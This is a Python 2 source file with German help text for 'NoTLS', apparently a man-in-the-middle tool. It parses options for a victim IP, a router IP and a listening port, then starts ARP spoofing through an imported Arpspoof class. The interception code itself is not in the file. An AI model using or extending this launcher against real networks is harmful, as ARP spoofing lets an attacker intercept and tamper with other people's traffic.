import sys, getopt, logging, traceback, string, os, struct, socket, thread
from myarppois import Arpspoof

version = '1.0'
def usage():
    print "\nNoTLS " + version + " von Robert de Meyer"
    print "Usage: NoTLS <optionen>\n"
    print "Optionen:"
    print "-w <filename>, --write=<filename>       Output in ein Logfile speichern (optional)."
    print "-i <interface>,--interface=<interface>  Interface, an dem das ARP spoofing aktiv ist.(default: eth0)"
    print "-v <victim>,   --victim=<victim>        IPv4 Adresse des Opfers fuer integriertes ARP spoofing."
    print "-r <router>,   --router=<router>        IPv4 Adresse des Routers bzw. Servers fuer integriertes ARP spoofing."
    print "-t <time>      --time=<time>            Zeit zum versenden der ARP Responses [in Sek]"
    print "-p <port>,     --port=<port>            Definiert der Listening Port (default 4443)."
    print "-s ,           --ssl                    Enabled erweitertes SSL Logging" 
    print "-d ,           --debug                  Enabled das debuglogging (verbose Output)."
    print "-h                                      Print this help message."
    print ""

def parseOptions(argv):
    logFile      = 'NoTLS.log'
    logLevel     = logging.WARNING
    interface    = 'eth0'
    arptime	 = 2
    routerIP	 = ''
    victimIP 	 = ''
    listenPort   = 4443

    
    try:                                
        opts, args = getopt.getopt(argv, "hw:i:v:r:t:p:sd", 
                                   ["help", "write=", "interface=", "victim=","router=","time=", "port=", "ssl", "debug"])

        for opt, arg in opts:
            if opt in ("-h", "--help"):
                usage()
                sys.exit()
            elif opt in ("-w", "--write"):
                logFile = arg
            elif opt in ("-i", "--interface"):
                interface = arg
	    elif opt in ("-v", "--victim"):
                victimIP = arg
            elif opt in ("-r", "--router"):
                routerIP = arg
            elif opt in ("-t", "--time"):
                arptime = arg
            elif opt in ("-p", "--port"):
                listenPort = arg
            elif opt in ("-s", "--ssl"):
                logLevel = logging.INFO
            elif opt in ("-d", "--debug"):
                logLevel = logging.DEBUG

	
        return (logFile, logLevel, arptime, routerIP, victimIP, listenPort)
                    
    except getopt.GetoptError:           
        usage()                          
        sys.exit(2)                         


def main(argv):
    (logFile, logLevel, arptime, routerIP, victimIP, listenPort) = parseOptions(argv)
  
    logging.basicConfig(level=logLevel, format='%(asctime)s %(message)s',
                        filename=logFile, filemode='w')

    # Hier wird die Eingabe von der routerIP, victimIP validiert und ggf. das ARP-Spoofing gestartet	
    if(victimIP != None and routerIP != None):
	    try:
		socket.inet_aton(victimIP)
	    except socket.error:
		sys.exit('Opfer besitzt keine gueltige IP Adresse')
	    if(routerIP != None):
		    try:
			socket.inet_aton(routerIP)
		    except socket.error:
			sys.exit('Router besitzt keine gueltige IP Adresse')
  	    arp = Arpspoof(routerIP, victimIP, arptime)
 	    try:
		arp.startspoofing()
	    	#thread.start_new_thread(arp.startspoofing, ())
	    except Exception as ex:
            	print ex
	    
    if(routerIP != None and victimIP == None):
	sys.exit('Opfer besitzt keine gueltige IP Adresse')
    elif(victimIP != None and routerIP == None):
	sys.exit('Router besitzt keine gueltige IP Adresse')

    print "Logfile: %s\nLogLevel: %s\nArptime: %sSekunden\nRouterip: %s\nVictimip: %s\nListenPort: %s\n"%  (logFile, logLevel, arptime, routerIP, victimIP, listenPort)         
    print "\nNoTLS " + version + " von Robert de Meyer wird gestartet..."


if __name__ == '__main__':
    main(sys.argv[1:])
